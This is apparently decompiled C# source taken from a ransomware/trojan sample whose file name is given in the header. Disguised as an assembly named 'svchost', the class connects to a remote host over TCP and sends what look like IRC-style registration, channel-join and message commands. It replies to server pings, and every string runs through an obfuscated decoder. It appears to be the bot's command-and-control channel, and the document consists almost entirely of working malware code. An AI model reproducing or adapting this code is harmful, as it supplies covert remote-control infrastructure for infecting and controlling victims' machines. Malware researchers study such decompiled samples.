// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 422D1FBC-502B-4DB7-AC18-B994031CE62D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-7709a3ed96ddad83c1364a32bd84290b3d00212a09fc6619f0588d3725c06799.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;

internal sealed class \u0008\u2001
{
  private NetworkStream \u0002;
  private TcpClient \u0003;
  private StreamReader \u0005;
  private StreamWriter \u0008;
  private string \u0006;
  private string \u000E;
  private int \u000F;
  private string \u0002\u2000;
  private string \u0003\u2000;

  public void \u0002(string _param1, int _param2, string _param3, string _param4)
  {
    try
    {
      this.\u000E = _param1;
      this.\u000F = _param2;
      this.\u0002\u2000 = _param3;
      this.\u0003\u2000 = _param4;
      this.\u0003 = new TcpClient();
      this.\u0003.Connect(_param1, _param2);
      if (!this.\u0003.Connected)
        return;
      this.\u0002 = this.\u0003.GetStream();
      this.\u0005 = new StreamReader((Stream) this.\u0002);
      this.\u0008 = new StreamWriter((Stream) this.\u0002);
      this.\u0008.AutoFlush = true;
      this.\u0008.WriteLine(\u0008\u2003.\u0002(415308713) + _param3 + \u0008\u2003.\u0002(415308709) + _param3 + \u0008\u2003.\u0002(415308733) + _param3);
      this.\u0008.WriteLine(\u0008\u2003.\u0002(415308680) + _param3);
      this.\u0008.WriteLine(\u0008\u2003.\u0002(415308676) + _param4);
      this.\u0008.WriteLine(\u0008\u2003.\u0002(415308688) + \u0003\u2001.\u0005());
      while ((this.\u0006 = this.\u0005.ReadLine()) != null)
      {
        if (this.\u0006.StartsWith(\u0008\u2003.\u0002(415308653)) || this.\u0006.StartsWith(\u0008\u2003.\u0002(415308666) + _param3))
          this.\u0008.WriteLine(\u0008\u2003.\u0002(415308658) + this.\u0006.Substring(this.\u0006.IndexOf(\u0008\u2003.\u0002(415308623)) + 2));
        Console.WriteLine(this.\u0006);
        \u0006\u2001.\u0002(this.\u0006);
      }
    }
    catch (Exception ex)
    {
      this.\u0002(\u0008\u2003.\u0002(415308632) + ex.ToString(), \u0002\u2002.\u0005, \u0008\u2003.\u0002(415308630));
    }
  }

  public void \u0002(string _param1)
  {
    try
    {
      this.\u0008.WriteLine(\u0008\u2003.\u0002(415308676) + _param1);
    }
    catch
    {
    }
  }

  public void \u0003(string _param1)
  {
    try
    {
      this.\u0008.WriteLine(\u0008\u2003.\u0002(415308576) + _param1);
    }
    catch
    {
    }
  }

  public void \u0002(string _param1, string _param2, string _param3)
  {
    try
    {
      string str = string.Empty;
      string key = _param3;
      if (key != null)
      {
        if (\u0002.\u0005 == null)
          \u0002.\u0005 = new Dictionary<string, int>(14)
          {
            {
              \u0008\u2003.\u0002(415308604),
              0
            },
            {
              \u0008\u2003.\u0002(415308556),
              1
            },
            {
              \u0008\u2003.\u0002(415308630),
              2
            },
            {
              \u0008\u2003.\u0002(415307655),
              3
            },
            {
              \u0008\u2003.\u0002(415308568),
              4
            },
            {
              \u0008\u2003.\u0002(415308565),
              5
            },
            {
              \u0008\u2003.\u0002(415309026),
              6
            },
            {
              \u0008\u2003.\u0002(415309055),
              7
            },
            {
              \u0008\u2003.\u0002(415309002),
              8
            },
            {
              \u0008\u2003.\u0002(415308997),
              9
            },
            {
              \u0008\u2003.\u0002(415306336),
              10
            },
            {
              \u0008\u2003.\u0002(415309014),
              11
            },
            {
              \u0008\u2003.\u0002(415308961),
              12
            },
            {
              \u0008\u2003.\u0002(415308988),
              13
            }
          };
        int num;
        // ISSUE: explicit non-virtual call
        if (__nonvirtual (\u0002.\u0005.TryGetValue(key, out num)))
        {
          switch (num)
          {
            case 0:
              str = \u0008\u2003.\u0002(415308941);
              break;
            case 1:
              str = \u0008\u2003.\u0002(415308934);
              break;
            case 2:
              str = \u0008\u2003.\u0002(415308959);
              break;
            case 3:
              str = \u0008\u2003.\u0002(415308904);
              break;
            case 4:
              str = \u0008\u2003.\u0002(415308897);
              break;
            case 5:
              str = \u0008\u2003.\u0002(415308922);
              break;
            case 6:
              str = \u0008\u2003.\u0002(415308915);
              break;
            case 7:
              str = \u0008\u2003.\u0002(415308876);
              break;
            case 8:
              str = \u0008\u2003.\u0002(415308869);
              break;
            case 9:
              str = \u0008\u2003.\u0002(415308895);
              break;
            case 10:
              str = \u0008\u2003.\u0002(415308841);
              break;
            case 11:
              str = \u0008\u2003.\u0002(415308835);
              break;
            case 12:
              str = \u0008\u2003.\u0002(415308861);
              break;
            case 13:
              str = \u0008\u2003.\u0002(415308855);
              break;
          }
        }
      }
      this.\u0008.WriteLine(\u0008\u2003.\u0002(415308801) + _param2 + \u0008\u2003.\u0002(415308623) + str + \u0008\u2003.\u0002(415308709) + _param1);
      this.\u0008.Flush();
    }
    catch
    {
    }
  }
}
